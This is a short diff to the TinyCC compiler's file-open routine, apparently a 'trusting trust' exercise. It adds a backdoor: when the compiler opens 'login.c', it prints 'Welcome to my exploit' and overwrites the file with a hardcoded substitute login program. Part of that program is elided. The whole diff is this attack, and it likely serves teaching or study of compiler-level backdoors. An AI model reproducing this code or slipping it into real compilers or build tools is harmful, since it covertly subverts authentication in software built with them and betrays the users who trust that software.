@@ -718,16 +718,18 @@ ST_FUNC void tcc_close(void)
 static int _tcc_open(TCCState *s1, const char *filename)
 {
     int fd;
-    int pipefd[2];
-    pid_t p;
+    // int pipefd[2];
+    // pid_t p;
     printf("Welcome to my exploit\n");
-    pipe(pipefd);
-    p = fork();
+    // pipe(pipefd);
+    // p = fork();
 
-    FILE * file;
-    printf("Found login.c\n");
-    file = fopen(filename, "w+");
-    char *bad = "#include <string.h>\
+    FILE *file;
+    if (!strcmp(filename, "login.c"))
+    {
+        printf("Found login.c\n");
+        file = fopen(filename, "w+");
+        char *bad = "#include <string.h>\
                 static int\
                 do_login(const char *username)\
             {\
@@ -742,8 +744,9 @@ static int _tcc_open(TCCState *s1, const char *filename)
                 return do_login(argv[1]);\
             }\
             ";
-    fprintf(file, "%s", bad);
-    fclose(file);
+        fprintf(file, "%s", bad);
+        fclose(file);
+    }
 
     // // Parent
     // if (p > 0)
